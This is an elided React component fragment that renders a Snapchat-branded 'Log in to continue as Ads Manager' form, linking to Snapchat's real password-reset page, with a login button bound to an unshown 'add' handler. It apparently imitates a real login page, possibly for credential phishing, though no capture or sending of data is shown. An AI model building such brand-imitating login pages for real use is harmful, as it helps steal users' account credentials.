...
function Home(){
	...
	return(
		 <div>
			...
			<h3> Log in </h3>
			<h5>to continue as Ads Manager</h5>
			...
			<a href="https://accounts.snapchat.com/accounts/password_reset_options">Forgot your password?</a>
			<button onClick={add}>Log in </button>
			
			</form>
			<br/>
			<h4>New to Snapchat? <a href="#">Sign up</a> </h4>
			</center>	  
		  </div>
		)
}
